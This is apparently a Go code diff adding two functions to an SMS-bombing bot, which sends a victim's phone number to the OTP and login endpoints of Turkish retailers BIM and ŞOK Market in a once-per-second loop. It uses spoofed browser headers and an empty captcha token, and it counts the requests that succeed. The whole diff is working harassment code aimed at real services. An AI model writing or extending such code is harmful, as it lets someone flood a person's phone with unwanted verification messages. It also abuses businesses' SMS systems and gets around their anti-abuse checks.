@@ -27,9 +27,99 @@ func (b *Bot) baslat() {
 		b.OhannesBurger()
 		b.wmf()
 		b.saloon()
+		b.sokmarket()
+		b.bim()
 		time.Sleep(1 * time.Second)
 
 	}
+}
+func (b *Bot) bim() {
+	client := &http.Client{Timeout: 10 * time.Second}
+	urlRegister := "https://bim.veesk.net:443/service/v1.0/account/login"
+	phone := b.Phone
+
+	payloadRegister := map[string]any{
+		"phone": phone,
+	}
+
+	jsonDataReg, _ := json.Marshal(payloadRegister)
+	reqReg, err := http.NewRequest("POST", urlRegister, bytes.NewBuffer(jsonDataReg))
+	if err != nil {
+		fmt.Println("bim Register Request hatası")
+		return
+	}
+
+	reqReg.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+	reqReg.Header.Set("Content-Type", "application/json")
+	reqReg.Header.Set("Accept", "application/json, text/plain, */*")
+	reqReg.Header.Set("Origin", "https://www.bim.com.tr/")
+	reqReg.Header.Set("Referer", "https://www.bim.com.tr/")
+
+	respReg, err := client.Do(reqReg)
+	if err != nil {
+		fmt.Println("[-] bim Bağlantı Hatası:", err)
+		return
+	}
+	defer respReg.Body.Close()
+
+	if respReg.StatusCode >= 200 && respReg.StatusCode < 4000 {
+		fmt.Println("[+] bim Başarılı!", b.Phone)
+		b.Adet++
+	} else {
+		body, _ := io.ReadAll(respReg.Body)
+		fmt.Printf("[-] bim Başarısız! (Status Code: %d)\n", respReg.StatusCode)
+		if len(body) > 0 {
+			fmt.Println("Sunucu Yanıtı:", string(body))
+		}
+	}
+
+	fmt.Println("Toplam Başarılı İstek Sayısı:", b.Adet)
+}
+func (b *Bot) sokmarket() {
+	client := &http.Client{Timeout: 10 * time.Second}
+	urlRegister := "https://giris.ec.sokmarket.com.tr/api/authentication/otp/generate"
+	phone := b.Phone
+
+	payloadRegister := map[string]any{
+		"captchaAction": "generate_login_otp",
+		"captchaToken":  "",
+		"clientId":      "buyer-web",
+		"phoneNumber":   phone,
+		"reCaptchaV2":   false,
+	}
+
+	jsonDataReg, _ := json.Marshal(payloadRegister)
+	reqReg, err := http.NewRequest("POST", urlRegister, bytes.NewBuffer(jsonDataReg))
+	if err != nil {
+		fmt.Println("sokmarket Register Request hatası")
+		return
+	}
+
+	reqReg.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+	reqReg.Header.Set("Content-Type", "application/json")
+	reqReg.Header.Set("Accept", "application/json, text/plain, */*")
+	reqReg.Header.Set("Origin", "https://giris.ec.sokmarket.com.tr/otp-login")
+	reqReg.Header.Set("Referer", "https://giris.ec.sokmarket.com.tr/otp-login")
+
+	respReg, err := client.Do(reqReg)
+	if err != nil {
+		fmt.Println("[-] sokmarket Bağlantı Hatası:", err)
+		return
+	}
+	defer respReg.Body.Close()
+
+	if respReg.StatusCode >= 200 && respReg.StatusCode < 4000 {
+		fmt.Println("[+] sokmarket Başarılı!", b.Phone)
+		b.Adet++
+	} else {
+		body, _ := io.ReadAll(respReg.Body)
+		fmt.Printf("[-] sokmarket Başarısız! (Status Code: %d)\n", respReg.StatusCode)
+		if len(body) > 0 {
+			fmt.Println("Sunucu Yanıtı:", string(body))
+		}
+	}
+
+	fmt.Println("Toplam Başarılı İstek Sayısı:", b.Adet)
 }
 func (b *Bot) Espressolab() {
 	url := "https://espressolab.com/api/register"
